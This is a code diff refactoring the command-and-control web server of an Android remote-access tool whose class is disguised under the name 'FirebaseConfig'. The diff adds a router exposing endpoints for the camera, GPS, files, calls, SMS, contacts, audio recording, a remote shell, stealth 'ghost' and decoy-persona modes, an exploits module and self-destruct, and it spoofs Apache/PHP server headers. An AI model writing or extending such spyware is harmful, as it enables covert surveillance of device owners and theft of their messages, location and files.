@@ -47,12 +47,16 @@ import java.security.KeyStore;
 import com.labs.labrats.modules.ExploitsModule;
 import com.labs.labrats.modules.TerminalModule;
 import com.labs.labrats.modules.GhostModule;
+import com.labs.labrats.router.AuthController;
+import com.labs.labrats.router.Router;
 import fi.iki.elonen.NanoHTTPD;
 
 public class FirebaseConfig extends NanoHTTPD {
 
     public static final int DEFAULT_PORT = 9191;
     private final Context context;
+    private final Router router = new Router();
+    private final AuthController authController;
     private final ExploitsModule exploitsModule;
     private final TerminalModule terminalModule;
     private final GhostModule ghostModule;
@@ -344,6 +348,8 @@ public class FirebaseConfig extends NanoHTTPD {
         this.commsModule = new com.labs.labrats.modules.CommsModule(this.context, this);
         this.intelModule = new com.labs.labrats.modules.IntelModule(this.context, this);
         this.acousticsModule = new com.labs.labrats.modules.AcousticsModule(this.context, this);
+        this.authController = new AuthController(this.context, this);
+        setupRouter();
         
         // Multi-Threaded Executor: Allows handling multiple C2 requests at once
         // Optimization: Uses a cached thread pool to reuse threads efficiently
@@ -514,71 +520,117 @@ public class FirebaseConfig extends NanoHTTPD {
         return serve404(null);
     }
 
+    private void setupRouter() {
+        router.registerPrefix("/c2/", session -> serveAsset(session, session.getUri()));
+        router.registerExact("/logo", this::serveLogo);
+        router.registerPrefix("/font/orbitron.ttf", this::serveFont);
+        router.registerPrefix("/exploits", session -> exploitsModule.handleRequest(session));
+        router.registerPrefix("/terminal", session -> terminalModule.handleRequest(session));
+        router.registerExact("/", session -> terminalModule.handleRequest(session));
+        router.registerPrefix("/ghost", session -> ghostModule.handleRequest(session));
+        router.registerExact("/stealth", session -> ghostModule.handleRequest(session));
+        router.registerPrefix("/camera", session -> opticsModule.handleRequest(session));
+        router.registerPrefix("/gps", session -> locateModule.handleRequest(session));
+        router.registerPrefix("/files", session -> dataModule.handleRequest(session));
+        router.registerPrefix("/download/", session -> dataModule.handleRequest(session));
+        router.registerPrefix("/calls", session -> commsModule.handleRequest(session));
+        router.registerPrefix("/sms", session -> commsModule.handleRequest(session));
+        router.registerPrefix("/mms", session -> commsModule.handleRequest(session));
+        router.registerExact("/contacts", session -> commsModule.handleRequest(session));
+        router.registerPrefix("/intel", session -> intelModule.handleRequest(session));
+        router.registerExact("/settings/password", this::updatePassword);
+        router.registerPrefix("/audio", session -> acousticsModule.handleRequest(session));
+        router.registerPrefix("/device", this::handleDeviceRoutes);
+    }
+
+    private Response handleDeviceRoutes(IHTTPSession session) {
+        String uri = session.getUri();
+        Map<String, String> params = session.getParms();
+        if (uri.equals("/device")) {
+            return serveDeviceInfo(session);
+        } else if (uri.equals("/device/vibrate")) {
+            vibrateDevice();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/max-volume")) {
+            setMaxVolume();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/silent-mode")) {
+            setSilentMode();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/shell")) {
+            return terminalModule.handleRequest(session);
+        } else if (uri.equals("/device/apps")) {
+            return serveAppList(session);
+        } else if (uri.equals("/device/open-app")) {
+            openAppOnDevice(params.get("pkg"));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/open-url")) {
+            openUrlOnDevice(params.get("url"));
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/decoy")) {
+            String choiceStr = params.get("choice");
+            if (choiceStr != null) {
+                try {
+                    int choice = Integer.parseInt(choiceStr);
+                    SystemAnalytics.setDecoyChoice(context, choice);
+                    SystemAnalytics.setStealthMode(context, true);
+                    logActivity("DECOY_SWITCH: Stealth identity updated to persona " + choice);
+                    return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"choice\": " + choice + "}");
+                } catch (Exception ignored) {}
+            }
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
+        } else if (uri.equals("/device/toast")) {
+            String msg = params.get("msg");
+            int size = 22, y = 250, duration = 3500;
+            String anim = params.get("anim"); if (anim == null) anim = "scroll";
+            String color = params.get("color"); if (color == null) color = "#FFFFFF";
+            try {
+                if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
+                if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
+                if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
+            } catch (Exception ignored) {}
+            showToast(msg, size, y, anim, duration, color);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/terminate")) {
+            logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                Intent intent = new Intent(context, WorkManager_Sync.class);
+                intent.setAction(Constants.ACTION_STOP_CORE);
+                context.startService(intent);
+            }, 1500);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
+        } else if (uri.equals("/device/self-destruct")) {
+            selfDestruct();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        }
+        return null;
+    }
+
     @Override
     public Response serve(IHTTPSession session) {
         if (session == null) return null;
-        
+
         String uri = session.getUri();
         if (uri == null) uri = "/";
-        
-        Response response;
+
+        Response response = null;
         CookieHandler cookies = session.getCookies();
-        
+
         try {
             // Watchdog: Update operator activity time for heartbeat scaling
             WorkManager_Sync.notifyOperatorActivity();
 
             // 0. Public Asset Handlers
             if (uri.equals("/favicon.ico")) {
-                return newFixedLengthResponse(Response.Status.NO_CONTENT, "image/x-icon", "");
+                response = newFixedLengthResponse(Response.Status.NO_CONTENT, "image/x-icon", "");
             }
-
             // 1. Handle Login (Standard Protocol)
-            if (uri.equals("/login") && session.getMethod() == Method.POST) {
-                session.parseBody(new HashMap<>());
-                String pass = session.getParms().get("password");
-                
-                // [DEEP_STEALTH] De-obfuscate payload if it's masked
-                if (pass != null && pass.startsWith("0x_")) {
-                    try {
-                        byte[] decoded = android.util.Base64.decode(pass.substring(3), android.util.Base64.DEFAULT);
-                        pass = new StringBuilder(new String(decoded, "UTF-8")).reverse().toString();
-                    } catch (Exception ignored) {}
-                }
-
-                boolean isJson = "true".equals(session.getParms().get("json"));
-                
-                if (pass != null && getStoredPassword().equals(pass.trim())) {
-                    logActivity("AUTHENTICATION_SUCCESS: Uplink established");
-                    
-                    if (isJson) {
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                    } else {
-                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
-                        response.addHeader("Location", "/");
-                    }
-                    
-                    // Stabilize session token
-                    WorkManager_Sync.activeSessionToken = sessionToken;
-                    response.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly; Max-Age=31536000");
-                } else {
-                    logActivity("UPLINK_DENIED: Invalid credentials");
-                    if (isJson) {
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
-                    } else {
-                        response = serveGzipped(session, "text/html", LOGIN_HTML.replace("RESTRICTED_ACCESS", "INVALID_CREDENTIALS"));
-                    }
-                }
-            } 
+            else if (uri.equals("/login") && session.getMethod() == Method.POST) {
+                response = authController.handleLogin(session, LOGIN_HTML);
+            }
             // 2. Handle Logout
             else if (uri.equals("/logout")) {
-                logActivity("AUTHENTICATION_TERMINATED: Session closed");
-                sessionToken = java.util.UUID.randomUUID().toString(); 
-                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                    .edit().putString("session_token", sessionToken).apply();
-                
-                response = serveGzipped(session, "text/html", LOGOUT_HTML);
-                response.addHeader("Set-Cookie", "token=deleted; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Strict");
+                response = authController.handleLogout(session, LOGOUT_HTML);
             }
             // 3. Main Routing & Auth Check
             else {
@@ -600,75 +652,14 @@ public class FirebaseConfig extends NanoHTTPD {
                         response = serveGzipped(session, "text/html", LOGIN_HTML);
                     }
                 } else {
-                    // Logged in: Process standard routes
-                    Map<String, String> params = session.getParms();
-                    
                     if (uri.equals("/login")) {
                         response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                         response.addHeader("Location", "/");
-                    } else if (uri.startsWith("/c2/")) {
-                        response = serveAsset(session, uri);
-                    } else if (uri.startsWith("/exploits")) {
-                        response = exploitsModule.handleRequest(session);
-                    } else if (uri.equals("/") || uri.isEmpty() || uri.startsWith("/terminal/")) {
-                        response = terminalModule.handleRequest(session);
-                    } else if (uri.startsWith("/ghost") || uri.equals("/stealth")) {
-                        response = ghostModule.handleRequest(session);
-                    } else if (uri.startsWith("/camera")) {
-                        response = opticsModule.handleRequest(session);
-                    } else if (uri.startsWith("/gps")) {
-                        response = locateModule.handleRequest(session);
-                    } else if (uri.equals("/files") || uri.startsWith("/files/") || uri.startsWith("/download/")) {
-                        response = dataModule.handleRequest(session);
-                    } else if (uri.equals("/calls") || uri.startsWith("/calls/") || uri.equals("/sms") || uri.startsWith("/sms/") || uri.equals("/mms") || uri.startsWith("/mms/") || uri.equals("/contacts")) {
-                        response = commsModule.handleRequest(session);
-                    } else if (uri.startsWith("/intel")) {
-                        response = intelModule.handleRequest(session);
-                    } else if (uri.equals("/settings/password")) {
-                        response = updatePassword(session);
-                    } else if (uri.startsWith("/audio")) {
-                        response = acousticsModule.handleRequest(session);
-                    } else if (uri.equals("/logo")) {
-                        response = serveLogo(session);
-                    } else if (uri.startsWith("/font/orbitron.ttf")) {
-                        response = serveFont(session);
-                    } else if (uri.equals("/device")) {
-                        response = serveDeviceInfo(session);
-                    } else if (uri.startsWith("/device/")) {
-                        // All other device sub-routes
-                        if (uri.equals("/device/vibrate")) { vibrateDevice(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/max-volume")) { setMaxVolume(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/silent-mode")) { setSilentMode(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/shell")) { response = terminalModule.handleRequest(session); }
-                        else if (uri.equals("/device/apps")) { response = serveAppList(session); }
-                        else if (uri.equals("/device/open-app")) { openAppOnDevice(params.get("pkg")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/open-url")) { openUrlOnDevice(params.get("url")); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else if (uri.equals("/device/toast")) {
-                            String msg = params.get("msg");
-                            int size = 22, y = 250, duration = 3500;
-                            String anim = params.get("anim"); if (anim == null) anim = "scroll";
-                            String color = params.get("color"); if (color == null) color = "#FFFFFF";
-                            try {
-                                if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
-                                if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
-                                if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
-                            } catch (Exception ignored) {}
-                            showToast(msg, size, y, anim, duration, color);
-                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
-                        }
-                        else if (uri.equals("/device/terminate")) {
-                            logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                Intent intent = new Intent(context, WorkManager_Sync.class);
-                                intent.setAction(Constants.ACTION_STOP_CORE);
-                                context.startService(intent);
-                            }, 1500);
-                            response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
-                        }
-                        else if (uri.equals("/device/self-destruct")) { selfDestruct(); response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}"); }
-                        else response = serve404(session);
                     } else {
-                        response = serve404(session);
+                        response = router.dispatch(session);
+                        if (response == null) {
+                            response = serve404(session);
+                        }
                     }
                 }
             }
@@ -679,14 +670,12 @@ public class FirebaseConfig extends NanoHTTPD {
         if (response != null) {
             response.addHeader("Server", "Apache/2.4.41 (Ubuntu)");
             response.addHeader("X-Powered-By", "PHP/7.4.3");
-            
-            // OPTICS_STABILITY: Exclude camera streams and assets from cache lockdown to prevent stutter
+
             if (!uri.equals("/logo") && !uri.startsWith("/font/") && !uri.contains("/camera/") && !uri.contains("/ghost/")) {
                 response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
                 response.addHeader("Pragma", "no-cache");
                 response.addHeader("Expires", "0");
             } else {
-                // For streams, use a lighter cache policy
                 response.addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
             }
         }
